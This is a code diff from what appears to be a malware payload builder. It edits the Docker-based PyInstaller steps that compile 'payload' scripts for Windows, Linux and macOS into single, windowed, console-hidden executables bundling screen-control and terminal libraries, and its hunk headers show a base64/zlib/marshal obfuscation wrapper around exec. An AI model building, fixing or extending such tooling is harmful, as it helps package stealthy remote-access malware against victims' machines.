@@ -297,7 +297,7 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
         try:
             if os_name == "Windows":
                 result = subprocess.run(
-                    f'docker run --platform linux/amd64 --env DISPLAY=$DISPLAY --volume "$(pwd):/src/{payload_file_name}/" darkavengerreborn/pyinstaller-windows:latest "pyinstaller -F --onefile --windowed --icon=NONE --hidden-import=pypiwin32 --hidden-import=pycryptodome --hidden-import=pywinpty --hidden-import=pyautogui --version-file=version_info.txt --hide-console hide-early {payload_file_name}.py"',
+                    f'docker run --platform linux/amd64 --env DISPLAY=$DISPLAY --volume "$(pwd)/{payload_file_name}:/src/" darkavengerreborn/pyinstaller-windows:latest "pyinstaller -F --onefile --windowed --icon=NONE --hidden-import=pypiwin32 --hidden-import=pycryptodome --hidden-import=pywinpty --hidden-import=pyautogui --version-file=version_info.txt --hide-console hide-early {payload_file_name}.py"',
                     shell=True,
                     capture_output=True,
                 )
@@ -310,7 +310,7 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
 
             elif os_name == "Linux":
                 result = subprocess.run(
-                    f'docker run --platform linux/amd64 --volume "$(pwd):/src/{payload_file_name}/" darkavengerreborn/pyinstaller-linux:latest "pyinstaller -F --onefile --windowed --runtime-tmpdir /tmp --icon=NONE --hidden-import=pty --hidden-import=pyautogui --hidden-import=tkinter --hidden-import=PyOpenGL --hide-console hide-early {payload_file_name}.py"',
+                    f'docker run --platform linux/amd64 --volume "$(pwd)/{payload_file_name}:/src/" darkavengerreborn/pyinstaller-linux:latest "pyinstaller -F --onefile --windowed --runtime-tmpdir /tmp --icon=NONE --hidden-import=pty --hidden-import=pyautogui --hidden-import=tkinter --hidden-import=PyOpenGL --hide-console hide-early {payload_file_name}.py"',
                     shell=True,
                     capture_output=True,
                 )
@@ -321,7 +321,7 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
 
             elif os_name == "OSX":
                 result = subprocess.run(
-                    f'docker run --platform linux/amd64 --volume "$(pwd):/src/{payload_file_name}/" darkavengerreborn/pyinstaller-osx:latest "pyinstaller -F --onefile --windowed --icon=NONE --hidden-import=pyautogui --hidden-import=pty --hide-console hide-early {payload_file_name}.py"',
+                    f'docker run --platform linux/amd64 --volume "$(pwd)/{payload_file_name}:/src/" darkavengerreborn/pyinstaller-osx:latest "pyinstaller -F --onefile --windowed --icon=NONE --hidden-import=pyautogui --hidden-import=pty --hide-console hide-early {payload_file_name}.py"',
                     shell=True,
                     capture_output=True,
                 )
@@ -330,11 +330,11 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
                 )  # Print output for debugging
                 shutil.copy(f"{payload_file_name}/dist/{payload_file_name}", f"payloads/{payload_file_name}")
 
-            os.remove(f"{payload_file_name}")
+            os.rmdir(f"{payload_file_name}")
         
         except Exception as e:
             print(e)
-            os.remove(f"{payload_file_name}")
+            os.rmdir(f"{payload_file_name}")
 
 
     # File uploads is working again full
